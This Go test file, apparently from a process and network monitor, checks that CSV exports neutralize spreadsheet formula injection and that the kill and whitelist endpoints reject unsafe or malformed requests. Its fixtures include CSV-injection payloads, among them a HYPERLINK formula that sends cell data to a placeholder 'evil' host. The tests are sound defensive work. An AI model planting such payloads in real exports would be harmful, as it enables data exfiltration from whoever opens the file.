package main

import (
	"encoding/csv"
	"net/http"
	"net/http/httptest"
	"strconv"
	"strings"
	"testing"
)

// jsonPost drives a handler directly (no middleware) with a JSON body.
func jsonPost(h http.HandlerFunc, target, body string) *httptest.ResponseRecorder {
	r := httptest.NewRequest(http.MethodPost, target, strings.NewReader(body))
	r.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	h(w, r)
	return w
}

// A process name or a detail line is attacker-influenced text, and the CSV is a
// forensic export that will be opened in a spreadsheet. A cell starting with
// = + - @ or a tab is a formula there, so it is neutralized with a leading
// apostrophe — the classic CSV-injection defence. Ordinary cells are untouched.
func TestExportCSVNeutralizesFormulas(t *testing.T) {
	setupTestDB(t)
	logEvent(Event{Kind: "new", PID: 4242, Process: `=HYPERLINK("http://evil/"&A1,"x")`,
		Exe: `C:\Users\x\AppData\Local\Temp\-2+3|cmd.exe`, Local: "0.0.0.0:1", Remote: "@SUM(1)",
		Detail: "\tcalc"})
	logEvent(Event{Kind: "closed", PID: 7, Process: "chrome.exe", Exe: "/opt/google/chrome/chrome",
		Remote: "93.184.216.34:443", Detail: "beaconing ~60s"})

	w := httptest.NewRecorder()
	handleExportCSV(w, httptest.NewRequest(http.MethodGet, "/export.csv", nil))
	rows, err := csv.NewReader(strings.NewReader(w.Body.String())).ReadAll()
	if err != nil {
		t.Fatalf("export is not valid CSV: %v\n%s", err, w.Body.String())
	}
	if len(rows) != 3 {
		t.Fatalf("rows = %d, want header + 2", len(rows))
	}
	var hostile, benign []string
	for _, r := range rows[1:] {
		if r[2] == "4242" {
			hostile = r
		} else {
			benign = r
		}
	}
	for i, cell := range hostile {
		if strings.ContainsAny(string([]rune(cell)[:1]), "=+-@\t\r") {
			t.Errorf("hostile row cell %d still starts a formula: %q", i, cell)
		}
	}
	// Compared on the parsed cells: the raw CSV doubles the inner quotes.
	for i, want := range map[int]string{3: `'=HYPERLINK("http://evil/"&A1,"x")`, 6: `'@SUM(1)`, 7: "'\tcalc"} {
		if hostile[i] != want {
			t.Errorf("hostile cell %d = %q, want the neutralized value %q", i, hostile[i], want)
		}
	}
	if benign[3] != "chrome.exe" || benign[7] != "beaconing ~60s" || benign[4] != "/opt/google/chrome/chrome" {
		t.Errorf("benign cells must be untouched: %v", benign)
	}
}

// The monitor must not be talked into killing itself or init, whatever the UI
// sends: both are refused before any process is touched.
func TestKillRefusesSelfAndInit(t *testing.T) {
	for _, body := range []string{
		`{"PID":` + itoa(int(ownPID)) + `}`,
		`{"PID":1}`,
	} {
		w := jsonPost(handleKill, "/api/kill", body)
		if w.Code != http.StatusBadRequest || !strings.Contains(w.Body.String(), `"ok":false`) {
			t.Errorf("kill %s: got %d %q, want 400 refusal", body, w.Code, w.Body.String())
		}
	}
}

// A JSON handler that ignores a decode error acts on the zero value: a bad
// body to /api/whitelist used to whitelist "" — and nothing bounded the body.
func TestJSONHandlersRejectBadBodies(t *testing.T) {
	setupTestDB(t)
	persistWhitelist.Store(false)
	for name, body := range map[string]string{
		"truncated": `{"Exe":`,
		"wrongtype": `{"Exe":123}`,
		"huge":      `{"Exe":"` + strings.Repeat("a", 2<<20) + `"}`,
	} {
		w := jsonPost(handleWhitelist, "/api/whitelist", body)
		if w.Code != http.StatusBadRequest {
			t.Errorf("%s body: got %d, want 400", name, w.Code)
		}
	}
	if n := len(whitelist()); n != 0 {
		t.Errorf("whitelist has %d entries after bad bodies, want 0", n)
	}
	for _, h := range []struct {
		name string
		fn   http.HandlerFunc
		path string
	}{
		{"ip_whitelist", handleIPWhitelist, "/api/ip_whitelist"},
		{"kill", handleKill, "/api/kill"},
		{"block_ip", handleBlockIP, "/api/block_ip"},
		{"unblock", handleUnblock, "/api/unblock"},
	} {
		if w := jsonPost(h.fn, h.path, `{"nope":`); w.Code != http.StatusBadRequest {
			t.Errorf("%s with a truncated body: got %d, want 400", h.name, w.Code)
		}
	}
}

func itoa(n int) string { return strconv.Itoa(n) }
